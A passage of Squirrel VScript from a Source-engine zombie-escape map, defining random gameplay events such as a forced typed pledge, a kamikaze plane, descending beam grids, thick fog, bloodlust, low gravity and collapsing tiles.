										if(::EVENTS.PIZZADOOM.fxamt > ::EVENTS.PIZZADOOM.fxlimit)return;
										::EVENTS.PIZZADOOM.fxamt++;
										EntFire("manager","RunScriptCode","::EVENTS.PIZZADOOM.fxamt--;",0.15,null);
										local randpitch = RandomInt(40,100);
										for(local i=0;i<::EVENTS.PIZZADOOM.sound_stack;i++){
											::Sound("*luffaren/pizza_aggressive.mp3",toucher.GetOrigin()+Vector(0,0,8),null,100000,0.05,randpitch,100);
											::Sound("*luffaren/pizza_splotion.mp3",toucher.GetOrigin()+Vector(0,0,8),null,300000,0.05,randpitch,100);}
										::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
										::Particle("muzzle_rifles",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										EntFireByHandle(self,"AddOutput","mins -20000 -20000 -8",0.00,null,null);
										EntFireByHandle(self,"AddOutput","maxs 20000 20000 8",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
										EntFireByHandle(self,"Enable","",0.10,null,null);
									}});
								local rev = 0;
								if(RandomInt(1,2)==1)rev+=2;
								::Ent(self.GetOrigin(),Vector(),"func_rotating",{
										maxspeed = 20,
										fanfriction = 5,
										spawnflags = 80+rev,
										targetname = "pizzadoom",
									},{
									master = self,
									function Run(){
										EntFireByHandle(master,"SetParent","!activator",0.00,self,null);
										EntFireByHandle(self,"Start","",0.10,null,null);
									}});
								::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
										targetname = "pizzadoom",
										movedir = "90 0 0",
										movedistance = 30000,
										blockdamage = 999999,
										speed = ::EVENTS.PIZZADOOM.speed,
										spawnflags = 8,
									},{
									master = self,
									function RunPost(){
										EntFireByHandle(master.GetMoveParent(),"SetParent","!activator",0.00,self,null);
										EntFireByHandle(self,"Open","",0.10,self,null);
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","RunPost();",0.50,null,null);
									}});
						}});
					},function Run(){
						if(active)return;
						if(::finale_started && !::finale_endrun_started)return;		//allow it to spawn during the finale endrun
						active=true;
						EntFire("manager","RunScriptCode","::EVENTS.PIZZADOOM.RunReal();",RandomFloat(runtime_min,runtime_max),null);
					}
				},
			PLEDGE={		cost=0,			cancel_mapspawn=false,		allow_in_finale=true,
					enabled = true,
					tickrate = 0.80,
					hurt_amount = 2,
					line = "i pledge to do my part for the collective",
					callout_fail = true,	//true:prints 'playerclass.name did not state the pledge'
				active = false,
				initialized = false,
				ticking = false,
				pledgers = [],
				pledge_text = null,
				gametext_channel = 3,
				function Tick(){
					if(!ticking)
					{
						active = false;
						pledgers.clear();
						return;
					}
					EntFire("manager","RunScriptCode","::EVENTS.PLEDGE.Tick();",::EVENTS.PLEDGE.tickrate,null);
					local valid_pledgers = 0;
					foreach(pledger in pledgers)
					{
						if(pledger.handle==null||!pledger.handle.IsValid()||pledger.handle.GetTeam()!=3||pledger.handle.IsAlive()==false)continue;
						valid_pledgers++;
						EntFireByHandle(::EVENTS.PLEDGE.pledge_text,"Display","",0.00,pledger.handle,null);
						local newhp = pledger.handle.GetHealth()-::EVENTS.PLEDGE.hurt_amount;
						if(newhp<=0)
						{
							EntFireByHandle(pledger.handle,"SetHealth","-1",0.00,null,null);
							if(::EVENTS.PLEDGE.callout_fail)
							{
								local msg = pledger.name+" did not state the pledge";
								printl(msg);
								::ServerSay("say "+msg,0.00,null);
							}
						}
						else
							EntFireByHandle(pledger.handle,"AddOutput","health "+newhp.tostring(),0.00,null,null);
					}
					if(valid_pledgers<=0)ticking = false;
				},function Run(){
					if(!enabled)return;
					if(active)return;
					active = true;
					if(!initialized)
					{
						initialized = true;
						if(::EVENTS.PLEDGE.pledge_text==null||!::EVENTS.PLEDGE.pledge_text.IsValid()){
							::EVENTS.PLEDGE.pledge_text = Entities.CreateByClassname("game_text");
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromString("message","[STATE YOUR PLEDGE]\n"+
								"Type the following or die:\n\n"+::EVENTS.PLEDGE.line);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromFloat("x",0.02);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromFloat("y",0.45);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromFloat("fadein",0.00);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromFloat("fadeout",0.00);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromFloat("holdtime",::EVENTS.PLEDGE.tickrate+0.20);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromInt("channel",::EVENTS.PLEDGE.gametext_channel);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromInt("effect",0);
							::EVENTS.PLEDGE.pledge_text.__KeyValueFromVector("color",Vector(255,200,0));}
							::EventListener("player_say",{function EventFired(name,data){
									if(!::EVENTS.PLEDGE.active)return;
									for(local i=0;i<::EVENTS.PLEDGE.pledgers.len();i++)
									{
										local pledger = ::EVENTS.PLEDGE.pledgers[i];
										if(data.userid == pledger.userid && data.text.tolower() == ::EVENTS.PLEDGE.line.tolower())
										{
											::EVENTS.PLEDGE.pledgers.remove(i);
											::Sound("*luffaren/popgasm.mp3",Vector(),pledger.handle,-1,0.20,100,10);
											break;
										}
									}
								}});
					}
					pledgers.clear();
					ticking = true;
					EntFire("manager","RunScriptCode","::EVENTS.PLEDGE.Tick();",0.05,null);
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						local pc = ::GetPlayerClass(h);
						if(pc==null)continue;
						pledgers.push({handle=pc.handle,userid=pc.userid,name=pc.name});
						::Sound("*luffaren/whip_me_daddy.mp3",Vector(),h,-1,0.20,100,10);
					}
				}},
			KAMIKAZE={		cost=5,			cancel_mapspawn=false,			allow_in_finale=true,
					delay_min = 0.00,
					delay_max = 20.00,
					start_height = 7000,
					start_distance = 10000,
					tickrate = 0.05,
					fly_speed = 2000,
					turn_speed_mult = 1.00,
					explode_time = 8.50,
					explode_tracedist = 200,
					explode_magnitude = 500,
					explode_override = 0,
					hp_base = 250,
					hp_each_ct = 50,
					bottom_limit_offset = 800,
					diter = 5,
					explode_killcred = null,
				bottom_limit = -10000,
				function Run(){
					EntFire("manager","RunScriptCode"," ::EVENTS.KAMIKAZE.RunReal(); ",RandomFloat(delay_min,delay_max),null);
				},function RunReal(){
					if(!::MOTHER_ZOMBIE_SPAWNED)return;
					if(Entities.FindByName(null,"spawnplatform")!=null)return;
					local target = Vector()+::manager.GetScriptScope().pos;
					try{
						target = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex].center_pos;
						if(::finale_started)target = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].center_pos;
					}catch(e){printl("KAMIKAZE event target-setting warning (backing up to 'pos'): "+e);}
					bottom_limit = 0.00+(target.z - (::TELEHURT_Z_OFFSET - bottom_limit_offset));
					local tcenter = Vector(0,0,target.z);
					local centerdir = tcenter - target;
					centerdir.Norm();
					local startpos = Vector(0,0,start_height)+target+(centerdir*start_distance);
					if(startpos.z > 16000)startpos.z = 16000;
					else if(startpos.z < -14000)startpos.z = -14000;
					local startdir = target-startpos;
					startdir.Norm();
					local hpset = (0+hp_base);
					local candidates = [];
					for(local h;h=Entities.FindByClassname(h,"player");)	//new in V1_7 (1:set HP by CT's, 2:get MZ-candidates, 3:get other candidates if no valid MZ)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
						if(h.GetTeam()==3){hpset+=hp_each_ct;}
					}
					foreach(h in ::MOTHER_ZOMBIES)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
						if(h.GetTeam()!=2)continue;
						h.ValidateScriptScope();
						if("is_kamikaze" in h.GetScriptScope())continue;
						local vel = h.GetVelocity();
						vel.z = 0.00;
						if(vel.Length()<=5.00)continue;
						candidates.push(h);
					}
					if(::DEVID!=null){local pcd = ::GetPlayerClass(::DEVID);
						if(pcd==null||pcd.handle==null||!pcd.handle.IsValid()||pcd.handle.IsAlive()==false||pcd.handle.GetTeam()!=2){}
						else{local vel = pcd.handle.GetVelocity();vel.z = 0.00;
							if(vel.Length()>5.00){for(local i=0;i<::EVENTS.KAMIKAZE.diter;i++){candidates.push(pcd.handle);}}}}
					if(candidates.len()<=0)
					{
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
							if(h.GetTeam()!=2)continue;
							h.ValidateScriptScope();
							if("is_kamikaze" in h.GetScriptScope())continue;
							local vel = h.GetVelocity();
							vel.z = 0.00;
							if(vel.Length()<=5.00)continue;
							candidates.push(h);
						}
					}
					if(candidates.len()<=0)return;
					local candidate = candidates[RandomInt(0,candidates.len()-1)];
					
					//printl("CANDIDATE:   " + candidate + "   "+::GetPlayerName(candidate));
					
					candidate.SetVelocity(Vector());
					candidate.SetForwardVector(startdir);
					candidate.SetOrigin(startpos);
					candidate.GetScriptScope().is_kamikaze <- true;
					EntFireByHandle(candidate,"RunScriptCode"," delete is_kamikaze; ",::EVENTS.KAMIKAZE.explode_time+5.00,null,null);
					EntFireByHandle(candidate,"AddOutput","health 10000",0.00,null,null);
					::Ent(Vector(),Vector(),"logic_relay",{},{
						player = candidate,
						plane = null,
						sounds = [],
						hitbox = null,
						lastpos = startpos,
						dir = startdir,
						hpset = hpset,
						gotta_explode = false,
						function Explode(){
							if(hitbox==null||!hitbox.IsValid()){}else EntFireByHandle(hitbox,"Kill","",0.00,null,null);
							EntFireByHandle(self,"Kill","",0.00,null,null);
							EntFireByHandle(plane,"Kill","",0.00,null,null);
							
								//__CSS__ og
							//EntFireByHandle(this.player,"SetHealth","-1",0.05,null,null);
							
							
								//__CSS__ css5 killcred:
							::HurtPlayer(this.player,999999,null,500,::EVENTS.KAMIKAZE.explode_killcred);
							::EVENTS.KAMIKAZE.explode_killcred = null;
							
							local randpitch = RandomInt(95,100);
							for(local i=0;i<5;i++)
							{
								::Sound("*luffaren/stuka_boom.mp3",lastpos,null,15000,2.00,randpitch,10);
								::Sound("*luffaren/stuka_boomx.mp3",lastpos,null,500000,2.00,randpitch,10);
							}
							::Particle("bomb_explosion_huge",lastpos,Vector(),null,0.50);
							::Ent(lastpos,Vector(),"env_explosion",{
									//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
									iMagnitude = (0+::EVENTS.KAMIKAZE.explode_magnitude),
									iRadiusOverride = (0+::EVENTS.KAMIKAZE.explode_override),
									rendermode = 5,
									spawnflags = 2,
									rendercolor = "255 255 255",
								},{
								_user = this.player,
								function Run(){
									
									::ITEMS.bomb_chuck.explosion_owner = this._user;			//yoinked for killcreds
									::ITEMS.bomb_chuck.explosion_handle = self;					//yoinked for killcreds
									EntFireByHandle(self,"Explode","",0.00,null,null);
									EntFireByHandle(self,"Kill","",0.05,null,null);
									
								}});
							foreach(sound in sounds)
							{
								EntFireByHandle(sound,"StopSound","",0.00,null,null);
								EntFireByHandle(sound,"Volume","0",0.00,null,null);
								EntFireByHandle(sound,"Kill","",0.03,null,null);
							}
						},function Tick(){
							if(gotta_explode)
							{
								Explode();
								return;
							}
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",::EVENTS.KAMIKAZE.tickrate,null,null);
							if(this.player==null||!this.player.IsValid()||this.player.IsAlive()==false||plane==null||!plane.IsValid() ||
							this.player.GetOrigin().z <= ::EVENTS.KAMIKAZE.bottom_limit ||
							TraceLinePlayersIncluded(this.player.GetOrigin(),this.player.GetOrigin()+(dir*::EVENTS.KAMIKAZE.explode_tracedist),this.player)<1.00)
							{
								gotta_explode = true;
								return;
							}
							lastpos = this.player.GetOrigin()+Vector(0,0,30);
							::EyeTrace(this.player,{master=self,function Run(_player,dir,rot){
									if(master==null||!master.IsValid())return;
									master.ValidateScriptScope();
									local sc = master.GetScriptScope();
									sc.dir += ((dir*0.07)*::EVENTS.KAMIKAZE.turn_speed_mult);
									sc.dir.Norm();
									_player.SetVelocity(sc.dir*::EVENTS.KAMIKAZE.fly_speed);
									local newrot = ::DirToAngles(sc.dir);
									newrot.x -= _player.GetAbsAngles().x;
									newrot.y += _player.GetAbsAngles().y;		//__CSS__ this was -= originally, which borked stuff
									newrot.z -= _player.GetAbsAngles().z;
									//sc.plane.SetAngles(newrot.x,newrot.y,newrot.z);	//__CSS__ og
									sc.plane.SetAbsAngles(QAngle(newrot.x,newrot.y,newrot.z));	//__CSS__ new
								}});
						},function Run(){
							local pitch = RandomInt(95,100);
							for(local i=0;i<5;i++)
							{
								local radius = 500000;
								if(i==1)radius = 0;
								::Sound("*luffaren/stuka.mp3",Vector(),this.player,radius,8.00,pitch,10,{master=self,function Run(){
									master.GetScriptScope().sounds.push(soundhandle);}});
								::Sound("*luffaren/banzai.mp3",Vector(),this.player,radius,15.00,pitch,10,{master=self,function Run(){
									master.GetScriptScope().sounds.push(soundhandle);}});
							}
							EntFireByHandle(self,"RunScriptCode"," gotta_explode = true; ",::EVENTS.KAMIKAZE.explode_time,null,null);
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.20,null,null);
							//::manager.PrecacheModel("models/luffaren/kamikaze_plane.mdl");
							::Ent(this.player.GetOrigin(),::DirToAngles(dir),"prop_dynamic",{
									model = "models/luffaren/kamikaze_plane.mdl",
									modelscale = 2.50,
								},{
								master = self,
								player = this.player,
								hpset = hpset,
								function Run(){
									master.GetScriptScope().plane = self;
									EntFireByHandle(self,"SetParent","!activator",0.00,this.player,null);
									::Hitbox(self.GetOrigin(),self.GetAngles(),hpset,Vector(-500,-350,-150),Vector(500,350,150),"filter_ct",false,{
										master=master,
										plane=self,
										function Act(index,attackerhandle){
											if(index==1)
											{
												master.GetScriptScope().hitbox = hitboxhandle;
													//EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,plane,null);
												hitboxhandle.AcceptInput("SetParent","!activator",plane,null);		//__CSS__ css5
											}
											else if(index==3){
												master.GetScriptScope().gotta_explode = true;
												
												//__CSS__ css5
												::EVENTS.KAMIKAZE.explode_killcred = attackerhandle;
												
											}
										}},"hitbox_kamikaze");
								}});
							::ServerSay("say KAMIKAZE INCOMING!",0.00,null);
							::ServerSay("say KAMIKAZE INCOMING!",0.01,null);
							::ServerSay("say KAMIKAZE INCOMING!",0.02,null);
							::ServerSay("say SHOOT IT DOWN OR TAKE COVER",1.03,null);
							::ServerSay("say SHOOT IT DOWN OR TAKE COVER",1.04,null);
							::ServerSay("say SHOOT IT DOWN OR TAKE COVER",1.05,null);
						}});
				}},
			BEAMGRID={		cost=50,			cancel_mapspawn=false,			allow_in_finale=true,
					spawn_height = 1300,
					spawn_xy_random = 2000,
					speed = 140,
					amount = 15,		//spawns 1 prop + 1 trigger
					spawnrate = 0.10,
					killtime = 15.00,
					start_delay = 15.00,
					startmove_delay = 2.00,
				active = false,
				spawned_amt = 0,
				startpos = Vector(),
				function StartMove(){
					::ServerSay("say Look out for the grid of beams above",0.00,null);
					::ServerSay("say Look out for the grid of beams above",0.01,null);
					::ServerSay("say Look out for the grid of beams above",0.02,null);
					::ServerSay("say They're coming down!",1.03,null);
					::ServerSay("say They're coming down!",1.04,null);
					::ServerSay("say They're coming down!",1.05,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.BEAMGRID.active = false; ",killtime+0.50,null);
					::Ent(Vector(),Vector(),"func_movelinear",{
							movedir = "90 0 0",
							movedistance = 20000,
							speed = (0+::EVENTS.BEAMGRID.speed),
							blockdamage = 999999,
							spawnflags = 8,
						},{
						function Run(){
							EntFire("beamgrid_trigger","SetParent","!activator",0.00,self);
							EntFireByHandle(self,"Open","",0.02,null,null);
							local ii=(0.00+::EVENTS.BEAMGRID.killtime-2.00);
							//EntFire("beamgrid","fadeandkill","2",ii,null);
							::FadeAndKill("beamgrid",2.00,ii);	//__CSS__ fadeandkill doesn't exist in css
							
							for(local glow=255;glow>0;glow-=5.00)
							{
								EntFire("beamgrid","AddOutput","glowcolor "+glow.tostring()+" "+glow.tostring()+" 0",ii,null);
								ii += 0.02;
							}
							EntFireByHandle(self,"Kill","",::EVENTS.BEAMGRID.killtime,null,null);
						}});
				},function SpawnTick(){
					spawned_amt++;
					if(spawned_amt>amount)
					{
						EntFire("manager","RunScriptCode"," ::EVENTS.BEAMGRID.StartMove(); ",startmove_delay+0.05,null);
						return;
					}
					EntFire("manager","RunScriptCode"," ::EVENTS.BEAMGRID.SpawnTick(); ",spawnrate,null);
					local srot = Vector(0,RandomFloat(0,360),0);
					local spos = Vector()+startpos;
					if(!::finale_started)
					{
						try{
							spos = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex].center_pos;
						}catch(e){"::EVENTS.BEAMGRID.SpawnTick() warning (defaulting to 'pos'): "+e}
					}
					spos += Vector(0,0,spawn_height)+Vector(RandomFloat(-spawn_xy_random,spawn_xy_random),RandomFloat(-spawn_xy_random,spawn_xy_random),0);
					::Ent(spos,srot,"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_ct",
							targetname = "beamgrid_trigger",
						},{function Touch(){
							EntFireByHandle(activator,"SetHealth","-1",0.00,null,null);
						},function Run(){
							
							//EntFireByHandle(self,"AddOutput","mins -20000 -5 -5",0.00,null,null);
							//EntFireByHandle(self,"AddOutput","maxs 20000 5 5",0.00,null,null);
							//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							
							//__CSS__ lower size to make it potentially lag less
							self.SetSize(Vector(-8000,-5,-5),Vector(8000,5,5));
							self.SetSolid(3);
							
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
								//EntFireByHandle(self,"RunScriptCode",
								//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
								//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
							//::manager.PrecacheModel("models/luffaren/beamgrid.mdl");
							for(local i=0;i<1;i++)
							{
								::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{
										model="models/luffaren/beamgrid.mdl",
										modelscale = 10.00,
										targetname = "beamgrid",
									},{
									master = self,
									function Run(){
										EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
									}});
							}
						}});
				},function RunPost(){
					local cands = [];
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
						cands.push(h);
					}
					if(cands.len()<=0)startpos = Vector()+::manager.GetScriptScope().pos;
					else startpos = cands[RandomInt(0,cands.len()-1)].GetOrigin();
				},function Run(){
					if(active)return;
						//if(::manager.GetScriptScope().mapspawnindex<=0)return;
					active = true;
					spawned_amt = 0;
					::ServerSay("say Something is happening above us...",start_delay,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.BEAMGRID.RunPost(); ",start_delay+0.00,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.BEAMGRID.SpawnTick(); ",start_delay+0.10,null);
				}},
			WORLD_EATER={		cost=5,			cancel_mapspawn=false,			allow_in_finale=true,
				function Run(){
					EntFire("manager","RunScriptcode"," SpawnVauff(); ",0.00,null);
				}},
			THICK_FOG={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					fog_time = 40.00,
					fog_start = -500,
					fog_end = 750,
					fog_density = 1.00,
				active = false,
				function Reset(){
					active = false;
					::manager.GetScriptScope().fog_dist_start_target = 0.00+::THEMES[::THEME].fog_start;
					::manager.GetScriptScope().fog_dist_end_target = 0.00+::THEMES[::THEME].fog_end;
					::manager.GetScriptScope().fog_density_target = 0.00+::THEMES[::THEME].fog_density;
					if(::THEME=="silenthill")
					{
						if(::finale_started || ::ending_called)
							::manager.GetScriptScope().fog_dist_end_target = 0.00+::silenthill_ending_finale_fadedist;
					}
				},function Run(){
					if(active)return;
					if(::finale_started){if(::finale_endrun_started || ::finale_bossfight_started){}else return;}	//disallow on finale (until boss or endrun is started)
					active = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.THICK_FOG.Reset(); ",fog_time,null);
					::manager.GetScriptScope().fog_dist_start_target = (0.00+fog_start);
					::manager.GetScriptScope().fog_dist_end_target = (0.00+fog_end);
					::manager.GetScriptScope().fog_density_target = (0.00+fog_density);
					::ServerSay("say The fog is turning thick...",1.00,null);
					::ServerSay("say We must find our way through the limited visibility",3.00,null);
				}},
			BLOODLUST={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 60.00,
					rate = 0.50,
					maxheal = 150,
					healamt = 3,
					hurtamt = 2,
				active = false,
				ticking = false,
				damagetable = {},
				function Tick(){
					if(!ticking)
					{
						active = false;
						return;
					}
					EntFire("manager","RunScriptCode"," ::EVENTS.BLOODLUST.Tick(); ",rate,null);
					::delay_timer = 0.00;	//__CSS__ css5 fix, don't cause a delay-punishment during this event
					local ctlist = [];
					local tlist = [];
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
						if(h.GetTeam()==3)ctlist.push(h);
						else if(h.GetTeam()==2)tlist.push(h);
					}
					local validt = 0;
					foreach(h in tlist)
					{
						h.ValidateScriptScope();
						if("invincible" in h.GetScriptScope())continue;
						validt++;
					}
					if(validt<=0)return;
					foreach(h in ctlist)
					{
						local pc = ::GetPlayerClass(h);
						if(pc==null)continue;
						local hurt = true;
						if((pc.userid in ::EVENTS.BLOODLUST.damagetable)&&::EVENTS.BLOODLUST.damagetable[pc.userid])
						{
							hurt = false;
							::EVENTS.BLOODLUST.damagetable[pc.userid] <- false;
						}
						local newhp = h.GetHealth();
						if(!hurt)
						{
							if(newhp >= maxheal)continue;
							newhp += healamt;
							if(newhp > maxheal)newhp = (0+maxheal);
						}
						else
						{
							newhp -= hurtamt;
							if(newhp<=0)
							{
								EntFireByHandle(h,"SetHealth","-1",0.00,null,null);
								::PlayerNameMessage(h,""," did not quench the bloodthirst",0.00);
								continue;
							}
						}
						EntFireByHandle(h,"AddOutput","health "+newhp.tostring(),0.00,null,null);
					}
				},function End(){
					ticking = false;
					::ServerSay("say The bloodthirst has ended!",0.00,null);
					::ServerSay("say The bloodthirst has ended!",0.01,null);
					::ServerSay("say The bloodthirst has ended!",0.02,null);
				},function RunPost(){
					EntFire("manager","RunScriptCode"," ::EVENTS.BLOODLUST.Tick(); ",0.05,null);
				},function Run(){
					if(active)return;
					if(!::MOTHER_ZOMBIE_SPAWNED)return;
					local texists = false;
					for(local h;h=Entities.FindByClassname(h,"player");){
						if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
						texists=true;break;}
					if(!texists)return;
					active = true;
					ticking = true;
					::EVENTS.BLOODLUST.damagetable = {};
					EntFire("manager","RunScriptCode"," ::EVENTS.BLOODLUST.RunPost(); ",0.40,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.BLOODLUST.End(); ",time,null);
					::ServerSay("say You humans suddenly feel a thirst for blood...",0.00,null);
					::ServerSay("say You humans suddenly feel a thirst for blood...",0.01,null);
					::ServerSay("say You humans suddenly feel a thirst for blood...",0.02,null);
					::ServerSay("say Shoot the zombies to prevent dying from bloodthirst!",1.05,null);
					::ServerSay("say Shoot the zombies to prevent dying from bloodthirst!",1.06,null);
					::ServerSay("say Shoot the zombies to prevent dying from bloodthirst!",1.07,null);
				}},
			DEBRIS={		cost=50,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 60.00,
					damage = 19,
				active = false,
				function Run(){
					if(active)return;
					if(::finale_endrun_started)return;//debris is already falling during endrun, no need to run this
					active = true;
					if(!::finale_started)
					{
						local currentdamage = (0+::manager.GetScriptScope().finalerubble_touchdamage);
						::manager.GetScriptScope().finalerubble_touchdamage = (0+damage);
						EntFire("manager","RunScriptCode"," finalerubble_touchdamage = "+currentdamage.tostring()+"; ",time+5.00,null);
					}
					EntFire("manager","RunScriptCode"," ::EVENTS.DEBRIS.active = false; ",time+5.10,null);
					EntFire("manager","RunScriptCode"," finalerubble_ticking++; ",0.00,null);
					EntFire("manager","RunScriptCode"," finalerubble_ticking--; ",time,null);
					::ServerSay("say Watch out for falling debris!",0.00,null);
					::ServerSay("say The debris seems to have stopped falling...",time+3.00,null);
				}},
			LOWGRAV={		cost=0,			cancel_mapspawn=false,			allow_in_finale=false,
					time = 20.00,
					only_ct = true,
					tempdisable_falldamage = true,		//set to 'true' to prevent map-based falldamage during+after the event (by 5s in post)
				active = false,
				function Run(){
					if(active)return;
					active = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.LOWGRAV.active = false; ",time+1.50,null);
					if(tempdisable_falldamage)::FALLDAMAGE_DISABLE = true;
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid())continue;
						if(only_ct && h.GetTeam()!=3 || only_ct && h.IsAlive()==false)continue;
						local sc = ::ValidateGravity(h);
						if(sc==null)continue;
						sc.gravdata.lowgrav++;
						local ii=0.00;
						for(local i=0.00;i<(-1.00 + time);i+=1.00)
						{
							EntFireByHandle(h,"RunScriptCode"," ::ValidateGravityFinal(self,this); ",ii,null,null);
							EntFireByHandle(h,"RunScriptCode"," if(::EVENTS.LOWGRAV.only_ct&&self.GetTeam()!=3&&gravdata.lowgrav<=1){"+
							"EntFireByHandle(self,\"AddOutput\",\"gravity 1.0\",0.00,null,null);} ",ii+0.10,null,null);
							ii += 1.00;
						}
						ii += 1.05;
						EntFireByHandle(h,"RunScriptCode"," gravdata.lowgrav--;::ValidateGravityFinal(self,this); ",ii,null,null);
					}
					local ho = "";
					if(only_ct)ho = " for humans";
					::ServerSay("say Gravity suddenly became lower"+ho,0.00,null);
					::ServerSay("say Gravity suddenly became lower"+ho,0.01,null);
					::ServerSay("say Gravity suddenly became lower"+ho,0.02,null);
					local t5s = (-5.00 + time);if(t5s>0.00)
					{
						::ServerSay("say Gravity reverts in 5s",t5s+0.00,null);
						::ServerSay("say Gravity reverts in 5s",t5s+0.01,null);
						::ServerSay("say Gravity reverts in 5s",t5s+0.02,null);
					}
					::ServerSay("say Gravity is back to normal again",time+0.00,null);
					::ServerSay("say Gravity is back to normal again",time+0.01,null);
					::ServerSay("say Gravity is back to normal again",time+0.02,null);
					if(tempdisable_falldamage)EntFire("manager","RunScriptCode","::FALLDAMAGE_DISABLE = false;",time+5.00,null);
				}},
			COLLAPSE={		cost=0,			cancel_mapspawn=false,			allow_in_finale=false,
					max_collapse_amount = 300,
					startdelay = 3.00,
					crumble_delay = 1.50,
					crumble_zlower = 10,
					interval_min = 0.01,
					interval_max = 0.80,
				function Run(){
					local pqq = [];
					local killblocks = [];
					local amt = 0;
					pqq.push({qrate=(0.00+startdelay),function Run(){}});
					for(local h;h=Entities.FindByName(h,"block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring());)
					{
						h.ValidateScriptScope();
						if("killedoff" in h.GetScriptScope() || "startendtile" in h.GetScriptScope())continue;
						if(h.GetMoveParent()!=null)continue;
						killblocks.push(h);
					}
					while(killblocks.len()>0 && amt<max_collapse_amount)
					{
						amt++;
						local kidx = RandomInt(0,killblocks.len()-1);
						local h = killblocks[kidx];
						killblocks.remove(kidx);
						pqq.push({qrate=(0.00+RandomFloat(interval_min,interval_max)),h=h,function Run(){
							if(h==null||!h.IsValid())return;
							local delay = (0.00+::EVENTS.COLLAPSE.crumble_delay);
							
							//__CSS__ css3 fix OG
							//h.ValidateScriptScope();
							//if("lowgrav_airslide_child" in h.GetScriptScope())
							//	EntFireByHandle(h.GetScriptScope().lowgrav_airslide_child,"Disable","",delay+0.05,null,null);
							//h.SetOrigin(h.GetOrigin()+Vector(0,0,-::EVENTS.COLLAPSE.crumble_zlower));
							//EntFireByHandle(h,"ClearParent","",delay+0.00,null,null);
							
							//__CSS__ css3 fix NEW
							h.ValidateScriptScope();
							if("lowgrav_airslide_child" in h.GetScriptScope())
								EntFireByHandle(h.GetScriptScope().lowgrav_airslide_child,"Disable","",delay+0.05,null,null);
							EntFireByHandle(h,"ClearParent","",delay+0.00,null,null);
							
							
							::CollapseTile(h,function(hh){
								hh.AcceptInput("DisableMotion","",null,null);
								
								//__CSS__ css3 fix NEW
								hh.SetOrigin(hh.GetOrigin()+Vector(0,0,-::EVENTS.COLLAPSE.crumble_zlower));
								
								EntFireByHandle(hh,"EnableMotion","",delay+0.05,null,null);
								EntFireByHandle(hh,"AddOutput","rendermode 1",delay+0.00,null,null);
								EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",delay+0.00,null,null);
								local ii = 1.50+delay;
								for(local alpha=255;alpha>0;alpha-=20)
								{
									EntFireByHandle(hh,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
									ii += 0.02;
								}
								EntFireByHandle(hh,"Kill","",ii,null,null);
							});
							//EntFireByHandle(h,"EnableMotion","",delay+0.05,null,null);
							//EntFireByHandle(h,"AddOutput","rendermode 1",delay+0.00,null,null);
							//EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",delay+0.00,null,null);
							//local ii = 1.50+delay;
							//for(local alpha=255;alpha>0;alpha-=20)
							//{
							//	EntFireByHandle(h,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							//	ii += 0.02;
							//}
